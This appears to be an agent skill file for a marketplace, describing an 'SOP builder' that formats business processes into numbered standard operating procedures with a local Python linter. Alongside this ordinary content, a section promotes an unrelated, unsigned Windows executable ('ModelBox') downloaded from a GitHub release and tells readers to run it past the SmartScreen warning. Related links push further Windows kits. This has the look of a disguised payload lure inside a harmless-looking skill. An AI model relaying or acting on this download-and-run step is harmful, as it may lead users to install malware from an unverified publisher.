---
name: us-sop-builder
description: Turns a messy process into a numbered US-style SOP with owner, trigger, steps, exceptions and a sign-off line. Use when the user asks for standard operating procedure template, sop builder, process documentation. For US small business owners and operations managers writing process documentation.
version: 1.0.6
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# US Business SOP Builder

**Turns a messy process into a numbered US-style SOP with owner, trigger, steps, exceptions and a sign-off line.** Written for US small business owners and operations managers writing process documentation.

Use this skill when someone asks for:

- standard operating procedure template
- sop builder
- process documentation
- us small business sop

---

## The job

Small teams document nothing, then repeat the same mistakes, and the person who knew the process leaves.

## What you get

1. Capture the trigger, the owner and the tools the process uses.
2. Write the steps as numbered actions a new hire can follow on day one.
3. Add the exceptions, the escalation path and the sign-off line.
4. Run the checklist linter so no step is missing an owner or a deadline.

Output contract:

- sop - numbered steps, each with an owner and a trigger
- exceptions - what to do when the process breaks
- signoff - the reviewer, the date and the version fields
- gaps - missing owner, missing tool or missing timing

## US specifics that matter

- US small business SOPs usually track owner, frequency, tools and the record the process produces.
- If the SOP touches customer data, the record-retention line has to name the retention period in the US state of operation.
- An SOP is a record of what was done, so keep it with the dated records of the process.

## Guardrails (hard rules)

- Never invent audit results or certification status.
- Never include real customer personal data in an example.
- Never publish an SOP as company policy; the owner approves it.

## Quickstart

### 1. Fill in the brief

`templates/sop-outline.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/lint_sop.py --input sop-outline.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/sop-structure.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**The six lines every SOP needs**

- Purpose: one line on what the process produces.
- Trigger: what starts it and when.
- Owner: the role that runs it, not a person's name.
- Steps: numbered actions with the tool used.
- Exceptions: the two or three ways it usually goes wrong.
- Sign-off: reviewer, date, version.

**Writing for a new hire**

- Use the verb first: click, email, log, call, reconcile.
- Name the system exactly: QuickBooks Online, ShipStation, Square, Zendesk.
- Add the time the step takes so the trainee can pace the work.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows desktop app with several AI models in one window,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/ModelBox-Windows-x64.zip` |
| File | `ModelBox-Windows-x64.zip` (9.6 MB) |
| SHA-256 | `ffe500c8c010240209e759480931c1ec6da6c232a3ddcfbf737a345717dc03ff` |
| Inside the archive | `ModelBox-Windows-x64.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\ModelBox-Windows-x64.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`ModelBox-Windows-x64.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

## Files in this bundle

- `SKILL.md` - this file
- `references/sop-structure.md` - How US teams structure an SOP
- `templates/sop-outline.yaml` - the brief to fill in
- `scripts/lint_sop.py` - the working script

## Verify the bundle

```bash
python3 scripts/lint_sop.py --input sop-outline.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
